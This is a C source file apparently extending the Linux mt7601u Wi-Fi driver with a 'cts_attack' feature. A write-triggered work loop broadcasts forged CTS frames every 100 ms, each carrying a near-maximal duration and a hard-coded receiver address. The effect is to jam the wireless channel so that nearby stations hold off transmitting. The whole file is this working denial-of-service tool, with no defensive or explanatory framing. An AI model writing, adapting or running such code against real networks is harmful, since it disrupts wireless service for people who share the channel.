#include <linux/skbuff.h>
#include <linux/timer.h>
#include <linux/kernel.h>
#include "mt7601u.h"

static const u8 CTS_Frame[] = {
    0x14, 0x00,     //header
    0xff, 0x7f,     //duration time 32ms
    0x7c, 0x3d, 0x09, 0x80, 0x83, 0x53, //receiver address(self)
};

static void mt7601u_cts_attack(struct mt7601u_dev *dev){
    struct sk_buff *skb;
    struct mt76_wcid *wcid = dev->mon_wcid;

    skb = dev_alloc_skb(sizeof(CTS_Frame));
    if(!skb)    
        return;

    skb_put_data(skb, CTS_Frame, sizeof(CTS_Frame));
    mt7601u_push_txwi(dev, skb, NULL, wcid, sizeof(CTS_Frame));
    mt7601u_dma_enqueue_tx(dev, skb, wcid, 0);
}

static void mt7601u_attack_work_handler(struct work_struct *work){
    struct mt7601u_dev *dev = container_of(work, struct mt7601u_dev, attack_work.work);
    if(!dev->attack_running)
        return;

    mt7601u_cts_attack(dev);
    schedule_delayed_work(&dev->attack_work, msecs_to_jiffies(100));
}

static ssize_t mt7601u_attack_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    struct mt7601u_dev *dev = file->private_data;
    int val;

    if(kstrtoint_from_user(buf, count, 0, &val))    return -EINVAL;

    if(val == 1 && !dev->attack_running){
        dev->attack_running = true;
        INIT_DELAYED_WORK(&dev->attack_work, mt7601u_attack_work_handler);
        schedule_delayed_work(&dev->attack_work,0);
    }else if(val == 0) {
        dev->attack_running = false;
        cancel_delayed_work_sync(&dev->attack_work);
    }

    return count;
}

const struct file_operations fops_attack = {
    .write = mt7601u_attack_write,
    .open = simple_open
};